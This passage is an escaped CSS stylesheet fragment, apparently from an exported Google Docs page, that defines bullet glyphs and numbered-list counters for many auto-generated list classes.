&quot;}ul.lst-kix_uuwuesmgh0v-0{list-style-type:none}.lst-kix_qehakqxejyir-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_jny1y8ia74gu-5&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_rdq5wlyhqi2l-7.start{counter-reset:lst-ctn-kix_rdq5wlyhqi2l-7 0}.lst-kix_df19sm7iqier-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_e3243wulvkb-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_7gh94rsyg3pc-5&gt;li{counter-increment:lst-ctn-kix_7gh94rsyg3pc-5}ol.lst-kix_8n3didooap36-1.start{counter-reset:lst-ctn-kix_8n3didooap36-1 0}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_t31j4fk48hym-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_uuwuesmgh0v-7{list-style-type:none}ul.lst-kix_uuwuesmgh0v-8{list-style-type:none}ul.lst-kix_uuwuesmgh0v-5{list-style-type:none}ul.lst-kix_uuwuesmgh0v-6{list-style-type:none}ul.lst-kix_uuwuesmgh0v-3{list-style-type:none}.lst-kix_82xwcoadaw1l-5&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_uuwuesmgh0v-4{list-style-type:none}ul.lst-kix_df19sm7iqier-8{list-style-type:none}ul.lst-kix_uuwuesmgh0v-1{list-style-type:none}ul.lst-kix_df19sm7iqier-7{list-style-type:none}ul.lst-kix_uuwuesmgh0v-2{list-style-type:none}ul.lst-kix_df19sm7iqier-6{list-style-type:none}.lst-kix_vujyyh29dyw5-7&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_jxi7mn5ld7an-2.start{counter-reset:lst-ctn-kix_jxi7mn5ld7an-2 0}.lst-kix_vujyyh29dyw5-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_vujyyh29dyw5-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_vujyyh29dyw5-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_rdq5wlyhqi2l-6&gt;li{counter-increment:lst-ctn-kix_rdq5wlyhqi2l-6}.lst-kix_7gh94rsyg3pc-8&gt;li{counter-increment:lst-ctn-kix_7gh94rsyg3pc-8}.lst-kix_8n3didooap36-5&gt;li{counter-increment:lst-ctn-kix_8n3didooap36-5}ol.lst-kix_ho9g9u9fgt2w-8.start{counter-reset:lst-ctn-kix_ho9g9u9fgt2w-8 0}ol.lst-kix_2a1s98goatwb-6.start{counter-reset:lst-ctn-kix_2a1s98goatwb-6 0}.lst-kix_dq55oor2y5qd-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_yc4eoxp4yku1-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_yc4eoxp4yku1-5,lower-roman) &quot;. &quot;}.lst-kix_yc4eoxp4yku1-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_yc4eoxp4yku1-6,decimal) &quot;. &quot;}.lst-kix_yc4eoxp4yku1-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_yc4eoxp4yku1-2,lower-roman) &quot;. &quot;}.lst-kix_pkd7hbr03pq1-3&gt;li{counter-increment:lst-ctn-kix_pkd7hbr03pq1-3}ol.lst-kix_jxi7mn5ld7an-7.start{counter-reset:lst-ctn-kix_jxi7mn5ld7an-7 0}.lst-kix_uuwuesmgh0v-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_yc4eoxp4yku1-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_yc4eoxp4yku1-8,lower-roman) &quot;. &quot;}.lst-kix_uuwuesmgh0v-7&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_2a1s98goatwb-1.start{counter-reset:lst-ctn-kix_2a1s98goatwb-1 0}.lst-kix_mg4z5bas7rnx-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_mg4z5bas7rnx-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_mg4z5bas7rnx-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_mg4z5bas7rnx-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_mg4z5bas7rnx-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_ho9g9u9fgt2w-2&gt;li{counter-increment:lst-ctn-kix_ho9g9u9fgt2w-2}.lst-kix_pipdk6l60rc8-4&gt;li{counter-increment:lst-ctn-kix_pipdk6l60rc8-4}.lst-kix_2ymhwgkcn4n-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_2ymhwgkcn4n-0,decimal) &quot;. &quot;}.lst-kix_n5ophhflxi4k-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_8n3didooap36-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_8n3didooap36-3,decimal) &quot;. &quot;}ul.lst-kix_jxi7mn5ld7an-0{list-style-type:none}.lst-kix_2ymhwgkcn4n-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_2ymhwgkcn4n-2,lower-roman) &quot;. &quot;}.lst-kix_23pctkk68nfg-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_hyye7g1opk7h-8&gt;li{counter-increment:lst-ctn-kix_hyye7g1opk7h-8}.lst-kix_5jrz2mxy905c-8&gt;li{counter-increment:lst-ctn-kix_5jrz2mxy905c-8}.lst-kix_uuwuesmgh0v-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_23pctkk68nfg-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_yc4eoxp4yku1-2&gt;li{counter-increment:lst-ctn-kix_yc4eoxp4yku1-2}.lst-kix_uuwuesmgh0v-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_ho9g9u9fgt2w-3&gt;li{counter-increment:lst-ctn-kix_ho9g9u9fgt2w-3}.lst-kix_r3qafwu9amb7-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_7g0li9r3maw0-5&gt;li{counter-increment:lst-ctn-kix_7g0li9r3maw0-5}.lst-kix_2ymhwgkcn4n-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_2ymhwgkcn4n-6,decimal) &quot;. &quot;}.lst-kix_r3qafwu9amb7-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_h5hx08hv18g-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_h5hx08hv18g-7,lower-latin) &quot;. &quot;}.lst-kix_r3qafwu9amb7-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_dq55oor2y5qd-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_h5hx08hv18g-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_h5hx08hv18g-1,lower-latin) &quot;. &quot;}ol.lst-kix_rdq5wlyhqi2l-1.start{counter-reset:lst-ctn-kix_rdq5wlyhqi2l-1 0}.lst-kix_dq55oor2y5qd-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_aijgezs7ihwn-4&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_h5hx08hv18g-7.start{counter-reset:lst-ctn-kix_h5hx08hv18g-7 0}ul.lst-kix_iwewjqe0yso6-5{list-style-type:none}ul.lst-kix_iwewjqe0yso6-4{list-style-type:none}ol.lst-kix_5jrz2mxy905c-8.start{counter-reset:lst-ctn-kix_5jrz2mxy905c-8 0}ul.lst-kix_iwewjqe0yso6-3{list-style-type:none}ul.lst-kix_iwewjqe0yso6-2{list-style-type:none}ul.lst-kix_iwewjqe0yso6-1{list-style-type:none}.lst-kix_pbw7k2omnys5-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_pbw7k2omnys5-3,decimal) &quot;. &quot;}.lst-kix_pbw7k2omnys5-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_pbw7k2omnys5-7,lower-latin) &quot;. &quot;}ul.lst-kix_iwewjqe0yso6-0{list-style-type:none}.lst-kix_aijgezs7ihwn-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_iwewjqe0yso6-8{list-style-type:none}ul.lst-kix_iwewjqe0yso6-7{list-style-type:none}ul.lst-kix_iwewjqe0yso6-6{list-style-type:none}.lst-kix_e3243wulvkb-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_e3243wulvkb-7&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_pkd7hbr03pq1-5.start{counter-reset:lst-ctn-kix_pkd7hbr03pq1-5 0}.lst-kix_n5ophhflxi4k-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_vujyyh29dyw5-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_vih28v9vxmim-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_pkd7hbr03pq1-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_pkd7hbr03pq1-1,lower-latin) &quot;. &quot;}.lst-kix_hyye7g1opk7h-2&gt;li{counter-increment:lst-ctn-kix_hyye7g1opk7h-2}.lst-kix_5jrz2mxy905c-2&gt;li{counter-increment:lst-ctn-kix_5jrz2mxy905c-2}.lst-kix_jxi7mn5ld7an-0&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_2ymhwgkcn4n-4{list-style-type:none}ol.lst-kix_rdq5wlyhqi2l-0.start{counter-reset:lst-ctn-kix_rdq5wlyhqi2l-0 0}ol.lst-kix_2ymhwgkcn4n-3{list-style-type:none}ol.lst-kix_2ymhwgkcn4n-2{list-style-type:none}ol.lst-kix_2ymhwgkcn4n-1{list-style-type:none}ol.lst-kix_2ymhwgkcn4n-0{list-style-type:none}.lst-kix_sdl0l5x6yq8f-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_rdq5wlyhqi2l-5&gt;li{counter-increment:lst-ctn-kix_rdq5wlyhqi2l-5}.lst-kix_sdl0l5x6yq8f-8&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_2ymhwgkcn4n-8{list-style-type:none}ol.lst-kix_2ymhwgkcn4n-7{list-style-type:none}ol.lst-kix_2ymhwgkcn4n-6{list-style-type:none}ol.lst-kix_2ymhwgkcn4n-5{list-style-type:none}.lst-kix_w35fdwefgib8-1&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_2a1s98goatwb-2.start{counter-reset:lst-ctn-kix_2a1s98goatwb-2 0}ol.lst-kix_h5hx08hv18g-3.start{counter-reset:lst-ctn-kix_h5hx08hv18g-3 0}.lst-kix_qd1fllvblyr-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_jxi7mn5ld7an-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_jxi7mn5ld7an-3,decimal) &quot;. &quot;}.lst-kix_23pctkk68nfg-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_4dgbyucsgzt8-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_cnyotsxn6ltg-1&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_pkd7hbr03pq1-1.start{counter-reset:lst-ctn-kix_pkd7hbr03pq1-1 0}.lst-kix_h5hx08hv18g-5&gt;li{counter-increment:lst-ctn-kix_h5hx08hv18g-5}.lst-kix_2ymhwgkcn4n-0&gt;li{counter-increment:lst-ctn-kix_2ymhwgkcn4n-0}.lst-kix_8n3didooap36-0&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_h5hx08hv18g-2.start{counter-reset:lst-ctn-kix_h5hx08hv18g-2 0}ul.lst-kix_bb177mxms8kw-5{list-style-type:none}ul.lst-kix_bb177mxms8kw-6{list-style-type:none}ul.lst-kix_bb177mxms8kw-3{list-style-type:none}ul.lst-kix_bb177mxms8kw-4{list-style-type:none}ul.lst-kix_bb177mxms8kw-1{list-style-type:none}ul.lst-kix_bb177mxms8kw-2{list-style-type:none}ul.lst-kix_bb177mxms8kw-0{list-style-type:none}.lst-kix_2ymhwgkcn4n-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_2ymhwgkcn4n-3,decimal) &quot;. &quot;}ul.lst-kix_bb177mxms8kw-7{list-style-type:none}ul.lst-kix_bb177mxms8kw-8{list-style-type:none}.lst-kix_hsg7ekf7ji1b-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_23pctkk68nfg-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_r3qafwu9amb7-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_uuwuesmgh0v-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_r3qafwu9amb7-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_hsg7ekf7ji1b-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_dq55oor2y5qd-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_brr67s28swow-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_brr67s28swow-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_t31j4fk48hym-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_ujo5hq8owa7j-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_ujo5hq8owa7j-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_dq55oor2y5qd-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_aijgezs7ihwn-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_pbw7k2omnys5-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_pbw7k2omnys5-6,decimal) &quot;. &quot;}.lst-kix_2a1s98goatwb-3&gt;li{counter-increment:lst-ctn-kix_2a1s98goatwb-3}.lst-kix_dg7blrqr8d63-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_hyye7g1opk7h-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_hyye7g1opk7h-8,lower-roman) &quot;. &quot;}.lst-kix_jny1y8ia74gu-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_hyye7g1opk7h-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_hyye7g1opk7h-4,lower-latin) &quot;. &quot;}ul.lst-kix_vih28v9vxmim-4{list-style-type:none}ul.lst-kix_vih28v9vxmim-5{list-style-type:none}ul.lst-kix_vih28v9vxmim-6{list-style-type:none}ul.lst-kix_vih28v9vxmim-7{list-style-type:none}ul.lst-kix_vih28v9vxmim-0{list-style-type:none}ul.lst-kix_vih28v9vxmim-1{list-style-type:none}.lst-kix_t31j4fk48hym-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_n5ophhflxi4k-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_vih28v9vxmim-2{list-style-type:none}.lst-kix_ho9g9u9fgt2w-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_ho9g9u9fgt2w-4,lower-latin) &quot;. &quot;}.lst-kix_ho9g9u9fgt2w-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_ho9g9u9fgt2w-8,lower-roman) &quot;. &quot;}ul.lst-kix_vih28v9vxmim-3{list-style-type:none}ul.lst-kix_vih28v9vxmim-8{list-style-type:none}.lst-kix_i1g4wgt7686h-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_h5hx08hv18g-2&gt;li{counter-increment:lst-ctn-kix_h5hx08hv18g-2}.lst-kix_5eiufpectkzt-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_i1g4wgt7686h-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_5eiufpectkzt-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_kpitf7q25bod-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_5eiufpectkzt-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_105qlabp070-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_i1g4wgt7686h-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_ay8c6zydp6wo-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_kpitf7q25bod-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_rdq5wlyhqi2l-8&gt;li{counter-increment:lst-ctn-kix_rdq5wlyhqi2l-8}.lst-kix_ay8c6zydp6wo-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_efugpt5gt85e-1&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_t31j4fk48hym-8{list-style-type:none}ul.lst-kix_t31j4fk48hym-7{list-style-type:none}ul.lst-kix_t31j4fk48hym-6{list-style-type:none}ul.lst-kix_t31j4fk48hym-5{list-style-type:none}ul.lst-kix_t31j4fk48hym-4{list-style-type:none}ol.lst-kix_ho9g9u9fgt2w-8{list-style-type:none}.lst-kix_efugpt5gt85e-4&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_t31j4fk48hym-3{list-style-type:none}ol.lst-kix_ho9g9u9fgt2w-7{list-style-type:none}ul.lst-kix_t31j4fk48hym-2{list-style-type:none}ul.lst-kix_t31j4fk48hym-1{list-style-type:none}ul.lst-kix_t31j4fk48hym-0{list-style-type:none}.lst-kix_4vw4podmovup-4&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_ho9g9u9fgt2w-6{list-style-type:none}ol.lst-kix_ho9g9u9fgt2w-5{list-style-type:none}.lst-kix_4vw4podmovup-1&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_ho9g9u9fgt2w-4{list-style-type:none}.lst-kix_2ymhwgkcn4n-3&gt;li{counter-increment:lst-ctn-kix_2ymhwgkcn4n-3}ol.lst-kix_ho9g9u9fgt2w-3{list-style-type:none}ol.lst-kix_ho9g9u9fgt2w-2{list-style-type:none}ol.lst-kix_ho9g9u9fgt2w-1{list-style-type:none}ol.lst-kix_ho9g9u9fgt2w-0{list-style-type:none}ol.lst-kix_jxi7mn5ld7an-1.start{counter-reset:lst-ctn-kix_jxi7mn5ld7an-1 0}.lst-kix_6l72wuovwro5-0&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_jxi7mn5ld7an-8.start{counter-reset:lst-ctn-kix_jxi7mn5ld7an-8 0}ul.lst-kix_2a1s98goatwb-0{list-style-type:none}.lst-kix_6l72wuovwro5-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_tx9oceqag1j0-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_ho9g9u9fgt2w-8&gt;li{counter-increment:lst-ctn-kix_ho9g9u9fgt2w-8}.lst-kix_efugpt5gt85e-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_4vw4podmovup-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_cnyotsxn6ltg-2{list-style-type:none}ol.lst-kix_2a1s98goatwb-7.start{counter-reset:lst-ctn-kix_2a1s98goatwb-7 0}ul.lst-kix_cnyotsxn6ltg-3{list-style-type:none}ul.lst-kix_cnyotsxn6ltg-4{list-style-type:none}.lst-kix_137rha48dom7-6&gt;li{counter-increment:lst-ctn-kix_137rha48dom7-6}ul.lst-kix_cnyotsxn6ltg-5{list-style-type:none}ul.lst-kix_cnyotsxn6ltg-6{list-style-type:none}ul.lst-kix_cnyotsxn6ltg-7{list-style-type:none}ul.lst-kix_cnyotsxn6ltg-8{list-style-type:none}ol.lst-kix_pkd7hbr03pq1-6.start{counter-reset:lst-ctn-kix_pkd7hbr03pq1-6 0}.lst-kix_cnyotsxn6ltg-4&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_jxi7mn5ld7an-6.start{counter-reset:lst-ctn-kix_jxi7mn5ld7an-6 0}.lst-kix_zf75tum0ttlq-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_rdq5wlyhqi2l-0&gt;li{counter-increment:lst-ctn-kix_rdq5wlyhqi2l-0}.lst-kix_hsg7ekf7ji1b-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_x1n37nye8y6i-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_ldlvyaupc5j0-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_esouuo5cwagu-1&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_jxi7mn5ld7an-3.start{counter-reset:lst-ctn-kix_jxi7mn5ld7an-3 0}.lst-kix_ldlvyaupc5j0-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_xq6rarus8xqa-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_m392is15i0yl-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_60bmaqde728h-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_esouuo5cwagu-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_7gh94rsyg3pc-3&gt;li{counter-increment:lst-ctn-kix_7gh94rsyg3pc-3}ol.lst-kix_pkd7hbr03pq1-4.start{counter-reset:lst-ctn-kix_pkd7hbr03pq1-4 0}.lst-kix_ujo5hq8owa7j-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_xq6rarus8xqa-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_b5bnssp5mcj5-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_hyye7g1opk7h-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_hyye7g1opk7h-1,lower-latin) &quot;. &quot;}.lst-kix_tm3swphxsxm3-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_brr67s28swow-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_2a1s98goatwb-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_2a1s98goatwb-8,lower-roman) &quot;. &quot;}.lst-kix_df19sm7iqier-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_ho9g9u9fgt2w-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_ho9g9u9fgt2w-1,lower-latin) &quot;. &quot;}.lst-kix_pbw7k2omnys5-2&gt;li{counter-increment:lst-ctn-kix_pbw7k2omnys5-2}.lst-kix_lnv8dxxow5z5-7&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_2a1s98goatwb-5.start{counter-reset:lst-ctn-kix_2a1s98goatwb-5 0}.lst-kix_82xwcoadaw1l-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_qehakqxejyir-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_t31j4fk48hym-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_jny1y8ia74gu-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_48bktl3sehd-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_vih28v9vxmim-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_48bktl3sehd-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_pkd7hbr03pq1-6&gt;li{counter-increment:lst-ctn-kix_pkd7hbr03pq1-6}.lst-kix_sdl0l5x6yq8f-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_pkd7hbr03pq1-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_pkd7hbr03pq1-4,lower-latin) &quot;. &quot;}.lst-kix_jxi7mn5ld7an-3&gt;li{counter-increment:lst-ctn-kix_jxi7mn5ld7an-3}.lst-kix_2ymhwgkcn4n-6&gt;li{counter-increment:lst-ctn-kix_2ymhwgkcn4n-6}ul.lst-kix_dnl50tn7ajrj-8{list-style-type:none}.lst-kix_7g0li9r3maw0-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_7g0li9r3maw0-5,lower-roman) &quot;. &quot;}ul.lst-kix_dnl50tn7ajrj-3{list-style-type:none}ul.lst-kix_dnl50tn7ajrj-2{list-style-type:none}ul.lst-kix_dnl50tn7ajrj-1{list-style-type:none}ul.lst-kix_dnl50tn7ajrj-0{list-style-type:none}.lst-kix_5jrz2mxy905c-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_5jrz2mxy905c-2,lower-roman) &quot;. &quot;}ul.lst-kix_dnl50tn7ajrj-7{list-style-type:none}ul.lst-kix_dnl50tn7ajrj-6{list-style-type:none}ul.lst-kix_dnl50tn7ajrj-5{list-style-type:none}ul.lst-kix_dnl50tn7ajrj-4{list-style-type:none}.lst-kix_7gh94rsyg3pc-0&gt;li{counter-increment:lst-ctn-kix_7gh94rsyg3pc-0}.lst-kix_vih28v9vxmim-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_8n3didooap36-8&gt;li{counter-increment:lst-ctn-kix_8n3didooap36-8}.lst-kix_w35fdwefgib8-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_m392is15i0yl-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_w35fdwefgib8-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_m392is15i0yl-2&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_pkd7hbr03pq1-7.start{counter-reset:lst-ctn-kix_pkd7hbr03pq1-7 0}.lst-kix_qd1fllvblyr-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_rdq5wlyhqi2l-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_rdq5wlyhqi2l-1,lower-latin) &quot;. &quot;}.lst-kix_4dgbyucsgzt8-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_bb177mxms8kw-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_qd1fllvblyr-2&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_pkd7hbr03pq1-8.start{counter-reset:lst-ctn-kix_pkd7hbr03pq1-8 0}.lst-kix_pipdk6l60rc8-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_pipdk6l60rc8-2,lower-roman) &quot;. &quot;}ol.lst-kix_2a1s98goatwb-8.start{counter-reset:lst-ctn-kix_2a1s98goatwb-8 0}.lst-kix_jxi7mn5ld7an-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_jxi7mn5ld7an-6,decimal) &quot;. &quot;}.lst-kix_bb177mxms8kw-1&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_v2df8br1ncnr-5{list-style-type:none}ul.lst-kix_v2df8br1ncnr-6{list-style-type:none}ul.lst-kix_v2df8br1ncnr-7{list-style-type:none}ul.lst-kix_v2df8br1ncnr-8{list-style-type:none}ul.lst-kix_v2df8br1ncnr-1{list-style-type:none}ul.lst-kix_v2df8br1ncnr-2{list-style-type:none}ul.lst-kix_v2df8br1ncnr-3{list-style-type:none}.lst-kix_3l83jjwr6djn-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_v2df8br1ncnr-4{list-style-type:none}.lst-kix_x1n37nye8y6i-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_8n3didooap36-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_8n3didooap36-6,decimal) &quot;. &quot;}.lst-kix_ygp4aypqry7g-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_cnyotsxn6ltg-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_n5ophhflxi4k-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_4dgbyucsgzt8-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_esouuo5cwagu-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_z3xg0uwuks4l-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_xq6rarus8xqa-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_ldlvyaupc5j0-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_h5hx08hv18g-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_h5hx08hv18g-4,lower-latin) &quot;. &quot;}.lst-kix_pipdk6l60rc8-1&gt;li{counter-increment:lst-ctn-kix_pipdk6l60rc8-1}.lst-kix_aijgezs7ihwn-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_iwewjqe0yso6-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_137rha48dom7-3&gt;li{counter-increment:lst-ctn-kix_137rha48dom7-3}ul.lst-kix_5eiufpectkzt-1{list-style-type:none}ul.lst-kix_5eiufpectkzt-0{list-style-type:none}ul.lst-kix_5eiufpectkzt-3{list-style-type:none}ul.lst-kix_5eiufpectkzt-2{list-style-type:none}ul.lst-kix_5eiufpectkzt-5{list-style-type:none}ul.lst-kix_5eiufpectkzt-4{list-style-type:none}ul.lst-kix_5eiufpectkzt-7{list-style-type:none}ul.lst-kix_5eiufpectkzt-6{list-style-type:none}.lst-kix_137rha48dom7-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_137rha48dom7-4,lower-latin) &quot;. &quot;}ul.lst-kix_5eiufpectkzt-8{list-style-type:none}.lst-kix_tm3swphxsxm3-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_b0yx1r9fgw53-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_7g0li9r3maw0-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_7g0li9r3maw0-8,lower-roman) &quot;. &quot;}.lst-kix_e3243wulvkb-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_jny1y8ia74gu-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_pbw7k2omnys5-5&gt;li{counter-increment:lst-ctn-kix_pbw7k2omnys5-5}.lst-kix_pbw7k2omnys5-0&gt;li:before{content:&quot;\0025cf   